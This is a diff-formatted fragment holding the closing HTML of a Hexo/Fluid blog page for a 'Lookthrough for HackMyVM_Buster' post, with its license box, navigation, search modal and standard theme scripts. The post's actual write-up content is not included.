+        <a href="/tags/lookthrough/" class="print-no-link">#lookthrough</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Lookthrough for HackMyVM_Buster</div>
+      <div>http://example.com/2025/02/18/HackMyVM_Buster/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Jednersaous</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年2月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/13/MAC%20x86%20for%20arm/" title="x86 for Macbook ARM64(especially penetration)">
+                        <span class="hidden-mobile">x86 for Macbook ARM64(especially penetration)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
